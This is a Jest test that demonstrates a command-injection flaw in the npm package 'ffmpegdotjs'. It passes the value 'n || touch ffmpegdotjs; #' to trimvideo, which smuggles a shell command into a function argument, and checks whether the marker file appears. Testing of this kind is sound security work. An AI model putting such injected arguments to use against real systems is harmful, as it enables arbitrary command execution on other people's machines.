test("Command Injection in ffmpegdotjs", () => {
  expect.assertions(2);
  let ffmpegdotjs = require("ffmpegdotjs");
  const fs = require("fs");
  const path = "./ffmpegdotjs";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return ffmpegdotjs
    .trimvideo("package-lock.json", 0, 30, "n || touch ffmpegdotjs; #")
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
